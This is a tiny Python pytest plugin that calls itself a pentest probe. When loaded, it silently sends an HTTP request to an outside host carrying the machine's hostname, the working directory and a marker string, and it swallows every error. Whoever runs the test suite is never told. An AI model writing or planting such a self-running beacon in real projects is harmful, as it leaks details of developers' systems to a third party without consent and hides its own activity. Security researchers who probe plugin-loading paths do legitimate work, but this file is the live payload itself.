"""Pentest probe plugin. Reports if pytest loads a plugin named by repository config."""
import urllib.parse, urllib.request, os, socket
def _r(m):
    try:
        urllib.request.urlopen("https://gokhan.kaledra.io/ptoob/tfl-plugin?" + urllib.parse.urlencode(
            {"marker": m, "host": socket.gethostname()[:60], "cwd": os.getcwd()[:120]}), timeout=6).read(16)
    except Exception:
        pass
_r("TFL_PLUGIN_EXEC_8842")
